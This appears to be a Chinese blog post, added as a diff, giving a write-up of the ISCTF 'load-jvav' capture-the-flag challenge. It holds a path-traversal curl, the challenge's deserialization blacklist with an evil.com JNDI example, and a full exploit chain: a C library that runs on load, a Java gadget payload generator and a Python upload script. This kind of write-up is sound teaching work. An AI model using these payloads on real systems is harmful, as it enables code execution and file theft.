@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>白白毛毛</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/_custom.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body class="bg-post">
+
+<div class="sidebar">
+    <div class="header-info">
+        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
+        <div class="site-author">白白毛毛</div>
+    </div>
+    <nav class="nav">
+        <a href="/">首页</a>
+        <a href="/categories">分类</a>
+        <a href="/archives">所有</a>
+    </nav>
+    <div class="contact-section">
+        <p>If you want find me:</p>
+        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
+        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
+        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
+    </div>
+</div>
+
+<div class="content-area">
+    
+<div style="height: 60px;"></div>
+<div class="content-wrapper">
+    <article class="post-article">
+        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">ISCTF-load-jvav</h1>
+        
+        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
+            <span>📅 发布: 2025-12-08</span>
+            <span style="margin: 0 15px;">|</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-29</span>
+            
+            
+             <span style="margin: 0 15px;">|</span>
+             📂 学习
+            
+        </div>
+        
+        <div class="article-content">
+            <p>没有吃过什么叫毫无头绪的可以过来打一下。\</p>
+<p>这一题是我觉得既然那题java反序列做了，那也来看看这个。</p>
+<h1 id="load-jvav"><a href="#load-jvav" class="headerlink" title="#load_jvav"></a>#load_jvav</h1><p><img src="/images/QQ20251211-193325.png" alt="alt text"></p>
+<p><img src="/images/QQ20251210-205652.png" alt="alt text"></p>
+<p>看着十分人畜无害，到时候，你就会狠狠老实了。</p>
+<p>题目写着java，所以大概率是java的后端，题目是没有给源码的，所以我们暂时无法确定这题的样子，我直接狠狠扫了一下。</p>
+<p>有一个admin。</p>
+<p><img src="/images/QQ20251210-210004.png" alt="alt text"></p>
+<p>访问一下，就有了一个，”data”: “居然你懂得访问admin目录，那么就告诉你个秘密:file:&#x2F;app&#x2F;ezJava.jar!&#x2F;BOOT-INF&#x2F;classes!&#x2F;“，一个小提醒。</p>
+<p>看到这个，其实我们就大致知道源码的位置了，我虽然不知道，要怎么做，我直接爆破了。</p>
+<p>各种爆破，直接拿下了源码，</p>
+<blockquote>
+<p>curl “<a target="_blank" rel="noopener" href="http://challenge.bluesharkinfo.com:24416/api/FileRead?filename=../../../app/ezjava_src.zip">http://challenge.bluesharkinfo.com:24416/api/FileRead?filename=../../../app/ezjava_src.zip</a>“</p>
+</blockquote>
+<p>还有，我们还得到了许多信息。</p>
+<p><img src="/images/QQ20251210-210723.png" alt="alt text"></p>
+<p>解码得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=/usr/local/openjdk-11</span><br><span class="line">JAVA_VERSION=11.0.13</span><br></pre></td></tr></table></figure>
+
+<p>这是后台java的版本。</p>
+<p><img src="/images/QQ20251210-211155.png" alt="alt text"></p>
+<p>Docker容器环境内启动的靶机，然后进程在跟cgroup里面。</p>
+<p><img src="/images/QQ20251210-211449.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar /app/ezJava.jar</span><br></pre></td></tr></table></figure>
+
+<p>目前的进程。</p>
+<p><img src="/images/QQ20251210-211604.png" alt="alt text"></p>
+<p>解码内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">if [ -n &quot;$DASFLAG&quot; ]; then</span><br><span class="line">    INSERT_FLAG=&quot;$DASFLAG&quot;</span><br><span class="line">    export DASFLAG=no_FLAG</span><br><span class="line">    DASFLAG=no_FLAG</span><br><span class="line">elif [ -n &quot;$FLAG&quot; ]; then</span><br><span class="line">    INSERT_FLAG=&quot;$FLAG&quot;</span><br><span class="line">    export FLAG=no_FLAG</span><br><span class="line">    FLAG=no_FLAG</span><br><span class="line">elif [ -n &quot;$GZCTF_FLAG&quot; ]; then</span><br><span class="line">    INSERT_FLAG=&quot;$GZCTF_FLAG&quot;</span><br><span class="line">    export GZCTF_FLAG=no_FLAG</span><br><span class="line">    GZCTF_FLAG=no_FLAG</span><br><span class="line">else</span><br><span class="line">    INSERT_FLAG=&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">mkdir -p /flag</span><br><span class="line">echo &quot;$INSERT_FLAG&quot; &gt; /flag/flag.flag</span><br><span class="line">chmod 744 /flag/flag.flag</span><br><span class="line"></span><br><span class="line">exec java \</span><br><span class="line">  -Dspring.autoconfigure.exclude=org.springframework.boot.actuate.autoconfigure.metrics.MetricsAutoConfiguration \</span><br><span class="line">  -jar /app/ezJava.jar</span><br></pre></td></tr></table></figure>
+
+<p>应用启动时从环境变量读取flag，flag被写入文件：<code>/flag/flag.flag</code>，写入后立即设置为 <code>no_FLAG</code>，环境变量被清除。</p>
+<p><img src="/images/QQ20251210-212025.png" alt="alt text"></p>
+<p>根目录读取，看见个flag。</p>
+<p><img src="/images/QQ20251210-212115.png" alt="alt text"></p>
+<p>app内文件读取，看见源代码了。</p>
+<p><img src="/images/QQ20251210-212153.png" alt="alt text"></p>
+<p>尝试直接读取flag，什么都没有。</p>
+<p><img src="/images/QQ20251210-212313.png" alt="alt text"></p>
+<p>解码得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>
+
+<p>历遍目录可以用。</p>
+<p><img src="/images/QQ20251211-184420.png" alt="alt text"></p>
+<p>直接读取flag位置，失败。</p>
+<p><img src="/images/QQ20251211-184530.png" alt="alt text"></p>
+<p>直接读取文件，发现成功了。</p>
+<hr>
+<p>这边其实拿到源码后，就能做了，只是比赛当时看不懂java里面的漏洞，所以没做出来，事不宜迟，直接上漏洞。</p>
+<p><img src="/images/QQ20251211-184801.png" alt="alt text"></p>
+<p>这边其实最主要的是这一段，研究一下，其实可以发现，如果当上传文件的后缀包含 <code>.ref</code> 时，后端会对文件内容进行 Base64 解码并反序列化。</p>
+<p>又是反序列化，又要找链。</p>
+<p><img src="/images/QQ20251211-184943.png" alt="alt text"></p>
+<p>还怪好的，youfindthis。</p>
+<p><img src="/images/QQ20251211-185217.png" alt="alt text"></p>
+<p>看这边，<code>readObject</code>使用了一个自定义的POFP方法。</p>
+<p><img src="/images/QQ20251211-185510.png" alt="alt text"></p>
+<p>紧接着这边<code>method.invoke(input, args)</code> 允许程序执行任何对象 (<code>input</code>) 的任何方法 (<code>method</code>)，并传入任何参数 (<code>args</code>)。</p>
+<p>其实题目也是有一个黑名单的，但是如果没注意，直接用这个，也没事。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">package com.example.utile;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">public class safeSer extends ObjectInputStream &#123;</span><br><span class="line"></span><br><span class="line">    private static final Set&lt;String&gt; BLACKLIST = new HashSet&lt;&gt;(Arrays.asList(</span><br><span class="line">            // Apache Commons Collections 相关类</span><br><span class="line">            &quot;org.apache.commons.collections.Transformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.functors.ChainedTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.functors.ConstantTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.functors.InvokerTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.map.DefaultedMap&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.map.LazyMap&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections.map.TransformedMap&quot;,</span><br><span class="line"></span><br><span class="line">            // Commons Collections4</span><br><span class="line">            &quot;org.apache.commons.collections4.Transformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections4.functors.ChainedTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections4.functors.ConstantTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;,</span><br><span class="line">            &quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;,</span><br><span class="line"></span><br><span class="line">            // 其他常见的危险类</span><br><span class="line"></span><br><span class="line">            &quot;javax.management.BadAttributeValueExpException&quot;,</span><br><span class="line">            &quot;java.rmi.server.UnicastRemoteObject&quot;,</span><br><span class="line">            &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">            &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">            //解决一些非预期问题</span><br><span class="line">            &quot;springboot&quot;,</span><br><span class="line">            &quot;springframework&quot;,</span><br><span class="line">            &quot;com.fasterxml&quot;,</span><br><span class="line">            &quot;jackson&quot;,</span><br><span class="line">            &quot;org.yaml&quot;,</span><br><span class="line">            &quot;org.thymeleaf&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    public safeSer(InputStream in) throws IOException &#123;</span><br><span class="line">        super(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        String className = desc.getName();</span><br><span class="line"></span><br><span class="line">        // 检查类是否在黑名单中</span><br><span class="line">        if (isMaliciousClass(className)) &#123;</span><br><span class="line">            throw new SecurityException(&quot;检测到潜在的反序列化攻击，类: &quot; + className);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return super.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private boolean isMaliciousClass(String className) &#123;</span><br><span class="line">        // 直接匹配黑名单</span><br><span class="line">//        if (BLACKLIST.contains(className)) &#123;</span><br><span class="line">//            return true;</span><br><span class="line">//        &#125;</span><br><span class="line">        for (String blacklist : BLACKLIST) &#123;</span><br><span class="line">            if (className.contains(blacklist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // 检查包名前缀（更严格的检测）</span><br><span class="line">        if (className.startsWith(&quot;org.apache.commons.collections.functors.&quot;) ||</span><br><span class="line">                className.startsWith(&quot;org.apache.commons.collections4.functors.&quot;) ||</span><br><span class="line">                className.startsWith(&quot;org.apache.commons.collections.&quot;) &amp;&amp;</span><br><span class="line">                        className.contains(&quot;Transformer&quot;)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>黑名单作用：</strong></p>
+<ol>
+<li>禁止了 Apache Commons Collections (CC 链)</li>
+</ol>
+<p>这是 Java 反序列化最经典、最普遍的利用链（ysoserial 中的 CC1 - CC7 等）。</p>
+<ul>
+<li><strong>核心执行类：</strong><ul>
+<li><code>Transformer</code>, <code>ChainedTransformer</code>, <code>ConstantTransformer</code>, <code>InvokerTransformer</code>, <code>InstantiateTransformer</code>。</li>
+<li><strong>作用：</strong> 这些类允许通过反射链式调用任意方法（通常是 <code>Runtime.exec</code>），是实现 RCE（远程代码执行）的引擎。</li>
+</ul>
+</li>
+<li><strong>触发类&#x2F;辅助类：</strong><ul>
+<li><code>DefaultedMap</code>, <code>LazyMap</code>, <code>TransformedMap</code>。</li>
+<li><strong>作用：</strong> 这些 Map 类通常用于装饰器模式，当攻击者访问 Map 元素或修改 Map 时，会自动触发内部的 Transformer 链，从而执行恶意代码。</li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li>禁止了高危的 JDK 原生及常用库利用点</li>
+</ol>
+<p>除了 CC 链，代码还封锁了几个历史上非常著名的反序列化 Sink（执行点）和 Source（入口点）。</p>
+<ul>
+<li><strong><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></strong><ul>
+<li><strong>攻击方式：</strong> 这是很多利用链（如 CC2, CC3, CC4, CommonsBeanutils1 等）的最终执行点。</li>
+<li><strong>原理：</strong> 它允许攻击者传入恶意的字节码，并在反序列化过程中通过 <code>defineClass</code> 动态加载该字节码，直接导致任意代码执行。</li>
+</ul>
+</li>
+<li><strong><code>com.sun.rowset.JdbcRowSetImpl</code></strong><ul>
+<li><strong>攻击方式：</strong> <strong>JNDI 注入</strong>。</li>
+<li><strong>原理：</strong> 攻击者可以设置 <code>dataSourceName</code> 为恶意的 RMI&#x2F;LDAP 地址（如 <code>rmi://evil.com/exploit</code>）。当该对象被反序列化（或触发 <code>setAutoCommit</code>）时，服务器会去连接恶意服务器并下载执行恶意对象。</li>
+</ul>
+</li>
+<li><strong><code>javax.management.BadAttributeValueExpException</code></strong><ul>
+<li><strong>攻击方式：</strong> 触发点（Trigger）。</li>
+<li><strong>原理：</strong> 它的 <code>readObject</code> 方法会触发内部对象的 <code>toString()</code> 方法。这通常被用来连接那些靠 <code>toString</code> 触发的利用链（例如 CC5）。</li>
+</ul>
+</li>
+<li><strong><code>java.rmi.server.UnicastRemoteObject</code></strong><ul>
+<li><strong>攻击方式：</strong> JRMP 攻击。</li>
+<li><strong>原理：</strong> 用于建立恶意的 RMI 连接，可能导致服务器反向连接攻击者的 JRMP 监听端口。</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li>“暴力”封禁了常见 Web 框架和库</li>
+</ol>
+<p>这一部分（代码注释标注为“解决一些非预期问题”）采用了一种非常激进的策略。由于 <code>isMaliciousClass</code> 使用的是 <code>className.contains(blacklist)</code>（包含匹配），只要类名里带有以下字符串，就会被拦截。</p>
+<ul>
+<li><strong><code>springboot</code>, <code>springframework</code></strong><ul>
+<li><strong>目的：</strong> 直接封杀所有 Spring 框架相关的类。防止利用 Spring 内部的 Gadget（如 <code>POJONode</code> 等）或 Spring 的 JNDI 利用点。</li>
+</ul>
+</li>
+<li><strong><code>com.fasterxml</code>, <code>jackson</code></strong><ul>
+<li><strong>目的：</strong> 封杀 Jackson JSON 库。虽然 Jackson 主要处理 JSON，但其某些类在原生序列化中也可能被滥用，或者配合多态反序列化进行攻击。</li>
+</ul>
+</li>
+<li><strong><code>org.yaml</code></strong><ul>
+<li><strong>目的：</strong> 封杀 SnakeYAML 相关类。</li>
+</ul>
+</li>
+<li><strong><code>org.thymeleaf</code></strong><ul>
+<li><strong>目的：</strong> 封杀 Thymeleaf 模板引擎相关类。</li>
+</ul>
+</li>
+</ul>
+<p>以上内容均为ai解析，我是没有看懂的，不过可以长长见识，有点印象。</p>
+<hr>
+<p>由于服务器器设置，我们是无法直接访问到flag所在的文件，所以，我们的想法是将flag搬出来，放在我们可以阅读的文件上。</p>
+<p>因为 C 语言能通过 <code>constructor</code> 实现“加载即运行”，而且 C 语言编写的文件在编译后正好是给机器阅读的二进制代码。</p>
+<p>由此，我们初步写出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">// 构造函数：库加载时自动执行</span><br><span class="line">void __attribute__ ((constructor)) setup(void) &#123;</span><br><span class="line">    FILE *src_flag, *dst_file;</span><br><span class="line">    char ch;</span><br><span class="line"></span><br><span class="line">    // 1. 打开源文件 (尝试标准路径)</span><br><span class="line">    src_flag = fopen(&quot;/flag/flag.flag&quot;, &quot;r&quot;);</span><br><span class="line">    if (src_flag == NULL) &#123;</span><br><span class="line">        // 如果失败，尝试根目录good.txt</span><br><span class="line">        src_flag = fopen(&quot;/flag&quot;, &quot;r&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (src_flag == NULL) return;</span><br><span class="line"></span><br><span class="line">    // 2. 打开目标文件 (写入到上传目录，避开 flag 关键字)</span><br><span class="line">    dst_file = fopen(&quot;/app/upload/hack.txt&quot;, &quot;w&quot;);</span><br><span class="line">    if (dst_file == NULL) &#123;</span><br><span class="line">        // 如果绝对路径不对，尝试相对路径</span><br><span class="line">        dst_file = fopen(&quot;./upload/hack.txt&quot;, &quot;w&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (dst_file == NULL) &#123;</span><br><span class="line">        fclose(src_flag);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3. 逐字节复制内容 (纯底层操作，不依赖 shell)</span><br><span class="line">    while ((ch = fgetc(src_flag)) != EOF) &#123;</span><br><span class="line">        fputc(ch, dst_file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(src_flag);</span><br><span class="line">    fclose(dst_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译后，将得到的恶意.so文件上传。紧接着，我们需要触发java反序列化，然后服务器读取我们的so文件，并将flag搬出。</p>
+<p>代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package com.example.utile;</span><br><span class="line"></span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class PayloadGen &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        YouFindThis gadget = new YouFindThis();</span><br><span class="line">        </span><br><span class="line">        // 1. 目标类: System</span><br><span class="line">        gadget.aClass = java.lang.System.class;</span><br><span class="line">        </span><br><span class="line">        // 2. 参数类型: String</span><br><span class="line">        gadget.argclass = String.class;</span><br><span class="line">        </span><br><span class="line">        // 3. 目标方法: load </span><br><span class="line">        gadget.methed = &quot;load&quot;;</span><br><span class="line">        </span><br><span class="line">        // 4. input: 静态方法忽略此参数，但需非空</span><br><span class="line">        gadget.input = &quot;ignored&quot;; </span><br><span class="line">        </span><br><span class="line">        // 5. 参数: .so 文件的绝对路径</span><br><span class="line">        gadget.args = &quot;/app/upload/hack_final.so&quot;; </span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(gadget);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个java代码运行出一大串的base64编码，然后我们利用py代码，直接上传。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = &quot;http://challenge.bluesharkinfo.com:26971/api/upload&quot;</span><br><span class="line"></span><br><span class="line">PAYLOAD = &quot;Base64字符串&quot; </span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">    print(f&quot;[*] 正在发送触发包 (System.load) 到: &#123;TARGET_URL&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 1. key 必须是 &#x27;file&#x27;</span><br><span class="line">    # 2. filename 必须以 .ref 结尾 (这是 api.java 触发反序列化的条件)</span><br><span class="line">    # 3. 内容 是 Java 生成的 Base64</span><br><span class="line">    files = &#123;</span><br><span class="line">        &#x27;file&#x27;: (&#x27;trigger.ref&#x27;, PAYLOAD, &#x27;application/octet-stream&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        # 发送请求</span><br><span class="line">        # timeout 设置为 10 秒，因为 System.load 可能会导致短暂阻塞</span><br><span class="line">        response = requests.post(TARGET_URL, files=files, timeout=10)</span><br><span class="line">        </span><br><span class="line">        print(f&quot;[*] 响应状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line">        print(f&quot;[*] 响应内容: &#123;response.text&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        if &quot;备份成功&quot; in response.text:</span><br><span class="line">            print(&quot;\n[+] 触发成功！&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\n[-] 未看到&#x27;备份成功&#x27;提示，但有可能已经执行。建议直接去尝试读取 Flag。&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;[-] 请求发送异常 (可能是因为服务被加载挂起了，属正常现象): &#123;e&#125;&quot;)</span><br><span class="line">        print(&quot;[*] 依然建议去尝试读取 Flag。&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    if PAYLOAD == &quot;这里填你生成的Base64字符串&quot;:</span><br><span class="line">        print(&quot;[-] 错误：请先将 Java 生成的 Base64 填入 PAYLOAD 变量！&quot;)</span><br><span class="line">    else:</span><br><span class="line">        exploit()</span><br></pre></td></tr></table></figure>
+
+<p>最后通过触发服务器java反序列化，执行我们的恶意文件，将flag搬出放在hack.txt上，直接访问hack.txt。就拿到了flag。</p>
+<hr>
+<p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
+
+        </div>
+    </article>
+</div>
+
+</div>
+
+<script src="/js/main.js?v=1767337365559"></script>
+</body>
+</html>
